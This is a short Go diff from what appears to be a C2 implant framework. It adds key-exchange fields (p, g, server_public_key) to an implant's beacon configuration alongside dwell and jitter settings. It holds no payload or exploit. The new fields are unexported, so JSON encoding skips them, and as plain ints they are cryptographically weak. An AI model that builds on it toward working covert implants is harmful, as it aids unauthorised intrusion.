@@ -11,9 +11,12 @@ import (
 )
 
 type ImplantConfig struct {
-	Dwell  string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
-	Jitter float64 `json:"jitter"`
-	//TODO:  ENCRYPTION FIELDS, TIMEOUT, USEPROXY, ENDPOINTS - then fix in listener ImplantConfig as well
+	Dwell             string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
+	Jitter            float64 `json:"jitter"`
+	p                 int     `json:"p"`
+	g                 int     `json:"g"`
+	server_public_key int     `json:"server_public_key"`
+	//TODO: TIMEOUT, USEPROXY, ENDPOINTS - then fix in listener ImplantConfig as well
 }
 
 type Implant struct {
